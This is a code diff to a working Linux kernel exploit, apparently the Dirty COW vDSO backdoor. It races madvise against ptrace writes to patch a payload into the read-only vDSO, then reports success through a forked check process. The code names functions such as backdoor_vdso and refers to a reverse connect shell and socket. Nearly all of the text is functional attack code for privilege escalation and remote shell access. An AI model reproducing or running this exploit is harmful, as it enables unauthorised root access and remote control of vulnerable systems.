@@ -53,7 +53,7 @@ struct prologue {
 struct mem_arg  {
 	void *vdso_addr;
 	bool do_patch;
-	bool patched;
+	bool stop;
 };
 
 static char child_stack[8192];
@@ -70,6 +70,60 @@ static struct prologue prologues[] = {
 	{ "\x55\x48\x89\xe5\x66\x66\x90", 7 },
 };
 
+static int writeall(int fd, const void *buf, size_t count)
+{
+	const char *p;
+	ssize_t i;
+
+	p = buf;
+	do {
+		i = write(fd, p, count);
+		if (i == 0) {
+			return -1;
+		} else if (i == -1) {
+			if (errno == EINTR)
+				continue;
+			return -1;
+		}
+		count -= i;
+		p += i;
+	} while (count > 0);
+
+	return 0;
+}
+
+static void *get_vdso_addr(void)
+{
+	char buf[4096], *p;
+	bool found;
+	FILE *fp;
+
+	fp = fopen("/proc/self/maps", "r");
+	if (fp == NULL) {
+		warn("fopen(\"/proc/self/maps\")");
+		return NULL;
+	}
+
+	found = false;
+	while (fgets(buf, sizeof(buf), fp) != NULL) {
+		if (strstr(buf, "[vdso]")) {
+			found = true;
+			break;
+		}
+	}
+
+	fclose(fp);
+
+	if (!found) {
+		fprintf(stderr, "failed to find vdso in /proc/self/maps");
+		return NULL;
+	}
+
+	p = strchr(buf, '-');
+	*p = '\0';
+
+	return (void *)strtoll(buf, NULL, 16);
+}
 
 static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n)
 {
@@ -112,33 +166,40 @@ static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n)
 	return 0;
 }
 
-static int patch_payload(struct prologue *prologue)
+static void *patch_payload(struct prologue *prologue)
 {
+	void *new_payload;
 	unsigned char *p;
 
-	p = memmem(payload, payload_len, PATCH, sizeof(PATCH)-1);
+	new_payload = malloc(payload_len);
+	if (new_payload == NULL) {
+		warn("malloc");
+		return NULL;
+	}
+
+	memcpy(new_payload, payload, payload_len);
+
+	p = memmem(new_payload, payload_len, PATCH, sizeof(PATCH)-1);
 	if (p == NULL) {
 		fprintf(stderr, "[-] failed to patch payload\n");
-		return -1;
+		free(new_payload);
+		return NULL;
 	}
 
 	memset(p, '\x90', sizeof(PATCH)-1 - prologue->size);
 	memcpy(p + sizeof(PATCH)-1 - prologue->size, prologue->opcodes, prologue->size);
 
-	return 0;
+	return new_payload;
 }
 
 static int build_vdso_patch(void *vdso_addr)
 {
 	uint32_t clock_gettime_offset, target;
 	unsigned long clock_gettime_addr;
-	unsigned char *p, *buf;
+	unsigned char *new_payload, *p, *buf;
 	struct prologue *prologue;
 	uint64_t entry_point;
-	bool patched;
 	int i;
-
-	fprintf(stderr, "[*] building vdso patch\n");
 
 	/* e_entry */
 	p = vdso_addr;
@@ -146,25 +207,26 @@ static int build_vdso_patch(void *vdso_addr)
 	clock_gettime_offset = (uint32_t)entry_point & 0xfff;
 	clock_gettime_addr = (unsigned long)vdso_addr + clock_gettime_offset;
 
-	patched = false;
+	/* patch payload with appropriate prologue */
+	new_payload = NULL;
 	for (i = 0; i < ARRAY_SIZE(prologues); i++) {
 		prologue = &prologues[i];
 		if (memcmp((void *)clock_gettime_addr, prologue->opcodes, prologue->size) == 0) {
-			if (patch_payload(prologue) == -1)
+			new_payload = patch_payload(prologue);
+			if (new_payload == NULL)
 				return -1;
-			patched = true;
 			break;
 		}
 	}
 
-	if (!patched) {
+	if (new_payload == NULL) {
 		fprintf(stderr, "[-] this vDSO version isn't supported\n");
 		fprintf(stderr, "    add first entry point instructions to prologues\n");
 		return -1;
 	}
 
 	/* patch #1: put payload at the end of vdso */
-	vdso_patch[0].patch = payload;
+	vdso_patch[0].patch = new_payload;
 	vdso_patch[0].size = payload_len;
 	vdso_patch[0].addr = (unsigned long)vdso_addr + VDSO_SIZE - payload_len;
 
@@ -209,16 +271,45 @@ static int backdoor_vdso(pid_t pid)
 	return 0;
 }
 
-/* check if vdso is entirely patched */
-static int check(bool do_patch)
+/*
+ * Check if vDSO is entirely patched. This function is executed in a different
+ * memory space because of fork(). The parent is notified thanks to the pipe.
+ */
+static int check(struct mem_arg *arg, int pipe)
 {
 	struct vdso_patch *p;
-	int i;
+	void *vdso_addr;
+	bool patched;
+	int i, j;
+	char c;
 
-	for (i = 0; i < 2; i++) {
-		p = &vdso_patch[i];
-		if (memcmp((void *)p->addr, p->patch, p->size) != 0)
+	vdso_addr = get_vdso_addr();
+	if (vdso_addr == NULL)
+		return -1;
+
+	/* rebuild patch since vDSO is at a different address */
+	if (build_vdso_patch(vdso_addr) == -1)
+		return -1;
+
+	for (i = 0; i < LOOP; i++) {
+		patched = true;
+		for (j = 0; j < ARRAY_SIZE(vdso_patch); j++) {
+			p = &vdso_patch[j];
+			if (memcmp((void *)p->addr, p->patch, p->size) != 0) {
+				patched = false;
+				break;
+			}
+		}
+
+		if (patched) {
+			fprintf(stderr, "[*] vdso successfully patched\n");
+			c = '!';
+			if (writeall(pipe, &c, sizeof(c)) == -1)
+				return -1;
 			return 0;
+		}
+
+		usleep(100);
 	}
 
 	return 1;
@@ -227,12 +318,11 @@ static int check(bool do_patch)
 static void *madviseThread(void *arg_)
 {
 	struct mem_arg *arg;
-	int i;
 
 	fprintf(stderr, "[*] starting madvise thread\n");
 
 	arg = (struct mem_arg *)arg_;
-	for(i = 0; i < LOOP && !arg->patched; i++) {
+	while (!arg->stop) {
 		if (madvise(arg->vdso_addr, VDSO_SIZE, MADV_DONTNEED) == -1) {
 			warn("madvise");
 			break;
@@ -262,50 +352,43 @@ static int debuggee(void *arg_)
 }
 
 /* use ptrace to write to read-only mappings */
-static int write_to_ro_mappings(struct mem_arg *arg)
+static void *ptrace_thread(void *arg_)
 {
-	int flags, i, ret, status;
+	struct mem_arg *arg;
+	int flags, status;
 	pid_t pid;
+	void *ret;
+
+	arg = (struct mem_arg *)arg_;
 
 	flags = CLONE_VM|CLONE_PTRACE;
 	pid = clone(debuggee, child_stack + sizeof(child_stack) - 8, flags, arg);
 	if (pid == -1) {
 		warn("clone");
-		return -1;
+		return NULL;
 	}
 
 	if (waitpid(pid, &status, __WALL) == -1) {
 		warn("waitpid");
-		return -1;
+		return NULL;
 	}
 
 	if (ptrace(PTRACE_CONT, pid, NULL, NULL) == -1) {
 		warn("ptrace(PTRACE_CONT)");
-		return -1;
+		return NULL;
 	}
 
 	if (waitpid(pid, &status, __WALL) == -1) {
 		warn("waitpid");
-		ret = -1;
+		ret = NULL;
 	}
 
-	for (i = 0; i < LOOP && !arg->patched; i++) {
+	ret = NULL;
+	while (!arg->stop) {
 		if (backdoor_vdso(pid) == -1) {
-			ret = -1;
+			ret = NULL;
 			break;
 		}
-
-		if (check(arg->do_patch)) {
-			fprintf(stderr, "[*] vdso successfully patched\n");
-			arg->patched = true;
-			ret = 0;
-			break;
-		}
-	}
-
-	if (!arg->patched) {
-		fprintf(stderr, "[-] failed to win race condition...\n");
-		ret = -1;
 	}
 
 	if (kill(pid, SIGKILL) == -1)
@@ -320,51 +403,63 @@ static int write_to_ro_mappings(struct mem_arg *arg)
 	return ret;
 }
 
-static void *get_vdso_addr(void)
-{
-	char buf[4096], *p;
-	bool found;
-	FILE *fp;
-
-	fp = fopen("/proc/self/maps", "r");
-	if (fp == NULL) {
-		warn("fopen(\"/proc/self/maps\")");
-		return NULL;
-	}
-
-	found = false;
-	while (fgets(buf, sizeof(buf), fp) != NULL) {
-		if (strstr(buf, "[vdso]")) {
-			found = true;
-			break;
-		}
-	}
-
-	fclose(fp);
-
-	if (!found) {
-		fprintf(stderr, "failed to find vdso in /proc/self/maps");
-		return NULL;
-	}
-
-	p = strchr(buf, '-');
-	*p = '\0';
-
-	return (void *)strtoll(buf, NULL, 16);
-}
-
 static int exploit(struct mem_arg *arg, bool do_patch)
 {
-	pthread_t pth;
+	pthread_t pth1, pth2;
+	pid_t pid;
+	int fd[2];
 	int ret;
+	char c;
 
-	arg->patched = false;
+	if (pipe(fd) == -1) {
+		warn("pipe");
+		return -1;
+	}
+
+	/* run "check" in a different memory space */
+	pid = fork();
+	if (pid == -1) {
+		warn("fork");
+		close(fd[0]);
+		close(fd[1]);
+		return -1;
+	} else if (pid == 0) {
+		close(fd[0]);
+		ret = check(arg, fd[1]);
+		close(fd[1]);
+		exit(ret);
+	}
+
+	close(fd[1]);
+
+	arg->stop = false;
 	arg->do_patch = do_patch;
 
-	pthread_create(&pth, NULL, madviseThread, arg);
-	ret = write_to_ro_mappings(arg);
+	pthread_create(&pth1, NULL, madviseThread, arg);
+	pthread_create(&pth2, NULL, ptrace_thread, arg);
 
-	pthread_join(pth, NULL);
+	/* wait for "check" process */
+	if (waitpid(pid, NULL, 0) == -1) {
+		warn("waitpid");
+		close(fd[0]);
+		return -1;
+	}
+
+	/* tell the 2 threads to stop and wait for them */
+	arg->stop = true;
+	pthread_join(pth1, NULL);
+	pthread_join(pth2, NULL);
+
+	/* check result */
+	if (read(fd[0], &c, sizeof(c)) == sizeof(c)) {
+		fprintf(stderr, "[+] yeah\n");
+		ret = 0;
+	} else {
+		fprintf(stderr, "[-] failed to win race condition...\n");
+		ret = -1;
+	}
+
+	close(fd[0]);
 
 	return ret;
 }
@@ -401,28 +496,6 @@ static int create_socket(void)
 	}
 
 	return s;
-}
-
-static int writeall(int fd, const void *buf, size_t count)
-{
-	const char *p;
-	ssize_t i;
-
-	p = buf;
-	do {
-		i = write(fd, p, count);
-		if (i == 0) {
-			return -1;
-		} else if (i == -1) {
-			if (errno == EINTR)
-				continue;
-			return -1;
-		}
-		count -= i;
-		p += i;
-	} while (count > 0);
-
-	return 0;
 }
 
 /* interact with reverse connect shell */
